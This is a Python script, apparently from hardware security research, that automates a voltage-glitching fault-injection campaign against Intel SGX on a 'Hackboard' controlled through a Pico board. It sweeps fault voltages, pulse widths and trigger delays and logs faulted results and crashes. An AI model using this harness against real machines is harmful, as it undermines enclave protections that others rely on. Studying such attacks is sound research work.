import time
import util
from constants import *
from udp.hackboard import Hackboard
from pc.pico_serial import PicoSerial

"""
Parameters:
    stable_voltage = 1.0

    fault_voltage = 0.8:0.5:-0.02
    fault_voltage = 0.57

    fault_width = 100:40:-5
    fault_width = 49

    delay_after_trigger = 0:100:1
    delay_after_trigger = 0

    rounds = 8
"""


def restart_pico():
    is_connected = False
    i = 0
    while not is_connected:
        logger.info(f"restarting for the {i+1}th time")
        pico.send_restart()
        time.sleep(10 + i)
        is_connected = util.ping_ip(IP) and hb.is_alive()
        i += 1
        if i == 10:
            logger.critical("10 retry attempts -> stopping")
            exit(-1)
    logger.info("restart finished")


parameters = util.parse_args("SGX Attack")

logger = logging.getLogger("sgx")
logger.info(f"Running with the following parameters:\n\t"
            + f"successive errors: {parameters.successive_errors}\n\t"
            + f"stable_voltage: {parameters.stable_voltage}\n\t"
            + f"rounds: {parameters.rounds}\n\t"
            + f"iterations: {parameters.iterations}\n\t"
            + f"fault_voltage: {parameters.fault_voltage}\n\t"
            + f"fault_width: {parameters.fault_width}\n\t"
            + f"delay_after_trigger: {parameters.delay_after_trigger}")
time_ests = util.calculate_time(parameters)
logger.info(f"Rough estimates of time: best = {time_ests[0]}, worst = {time_ests[1]}")


pico = PicoSerial()
hb = Hackboard()

if not util.ping_ip(IP):
    logger.critical("Not connected to hackboard")
    # pico.send_restart()
    os._exit(-1)

if not hb.is_alive():
    logger.error("two way communication with HB not working, restarting")
    restart_pico()

code, output = hb.exec_command("ls")
if code != 0:
    logger.critical(f"simple ls did not work. Code: {code}, Output: {output}")
    os._exit(-1)

times = []
start_time = time.time()

logger.info("Start testing")
for iteration in parameters.iterations:
    for delay_after_trigger in parameters.delay_after_trigger:
        for fault_voltage in parameters.fault_voltage:
            for fault_width in parameters.fault_width:
                program = f"bash ./sgx-script.sh {700000} {0} {iteration}"
                errors = 0
                no_return = 0
                crash = 0
                successive_errors = 0
                for round in range(parameters.rounds):
                    prev_crash = crash
                    prev_no_return = no_return
                    logger.info(
                        f"Round: {round} - voltage: {fault_voltage} (0x{util.voltage_to_hex(fault_voltage)}), width: {fault_width}, delay_after_trigger: {delay_after_trigger}, iterations: {iteration}")

                    code, output = pico.starting_and_glitching(program,
                                                               delay_after_trigger,
                                                               util.voltage_to_hex(fault_voltage),
                                                               True,
                                                               util.voltage_to_hex(parameters.stable_voltage),
                                                               fault_width)
                    if code != 0:
                        no_return += 1
                        logger.error(f"HB error: {code} => {output}")
                    # else:
                        # logger.info(f"HB: {output}")
                    if 'Faulted result' in output:
                        t = time.time()
                        times.append(t - start_time)
                        logger.info(f"Fault found after {t - start_time}s")
                        logger.info(f"Times mean {util.mean(times)}. stdev: {util.stdev(times)}")
                        start_time = t

                    if not util.ping_ip(IP) or not hb.is_alive():
                        crash += 1
                        logger.warning(f"ssh disconnected -> crashes: {crash}")
                        restart_pico()
                    if crash > prev_crash or no_return > prev_no_return:
                        errors += 1
                        successive_errors += 1
                        logger.warning(f"Currently: {errors} errors and successive errors: {successive_errors} / {parameters.successive_errors}")
                    else:
                        successive_errors = 0

                    if parameters.successive_errors != 0 and successive_errors >= parameters.successive_errors:
                        logger.critical(f"Last {successive_errors} were errors")
                        break
                logger.results(
                    f"Finished rounds with {errors}/{round+1} errors (crash: {crash}, error: {no_return}) for v: {fault_voltage}, w: {fault_width}, dat: {delay_after_trigger}, iterations: {iteration},")


logger.info(f"end of all rounds. times: {times}, mean: {util.mean(times)}, stdev: {util.stdev(times)}")
